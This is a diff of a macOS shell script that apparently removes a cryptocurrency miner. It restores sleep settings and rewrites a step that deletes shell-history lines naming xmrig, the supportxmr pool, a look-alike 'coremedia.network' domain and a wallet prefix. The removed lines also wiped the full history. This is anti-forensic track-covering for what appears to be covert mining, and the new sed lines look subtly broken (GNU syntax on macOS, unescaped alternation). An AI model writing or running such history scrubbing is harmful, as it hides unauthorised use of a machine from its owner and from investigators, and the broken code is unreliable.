@@ -44,11 +44,10 @@ pmset -a displaysleep 10
 pmset -a standby 1
 echo "      ✓ Sleep settings restored"
 
-echo "[6/6] Scrubbing history..."
-for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
-  [[ -f "$H" ]] && sed -i '' '/mine_xmr\|xmrig\|supportxmr\|coremedia\.network\|45yWnSb/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
-done
-history -c 2>/dev/null || true
+echo "[6/6] Cleaning mining traces..."
+  # Only remove mining-specific lines, not full history
+  sed -i '/mine_qrl|xmrig|supportxmr|coremedia.network/d' "$HOME/.zsh_history" 2>/dev/null || true
+  sed -i '/mine_qrl|xmrig|supportxmr|coremedia.network/d' "$HOME/.bash_history" 2>/dev/null || true
 
 echo ""
 [[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" ]] \
